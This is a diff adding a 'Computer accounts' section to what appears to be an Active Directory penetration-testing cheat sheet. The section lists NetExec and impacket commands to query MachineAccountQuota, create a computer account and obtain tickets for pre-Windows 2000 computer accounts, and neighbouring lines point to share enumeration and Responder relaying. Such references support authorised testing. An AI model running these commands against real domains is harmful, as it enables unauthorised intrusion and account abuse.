@@ -374,6 +374,43 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   ```
 </details>
 
+# Computer accounts 
+
+<details>
+  <summary> NetExec MachineAccountQuota </summary> 
+
+#### Retrieve the MachineAccountQuota 
+```shell
+NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M maq
+```
+
+</details>
+
+<details>
+  <summary> impacket-addcomputer </summary> 
+
+#### Create a computer account
+```shell
+impacket-addcomputer -dc-ip <Domain_Controller_IP> -computer-name <Computer_Name> -computer-pass '<computer_password>' '<AD_domain>/<AD_user>:<AD_password>'
+```
+
+</details>
+
+<details>
+  <summary> Pre-Windows 2000 computers </summary> 
+
+#### NetExec pre2k - obtain tickets
+```shell
+NetExec ldap <Domain_Controller_IP> -u <AD_user> -p <AD_password> -M pre2k
+```
+
+#### Pre2k
+```shell
+pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP> 
+```
+
+</details>
+
 # MITM and Relaying
 <details>
   <summary> Responder </summary> 
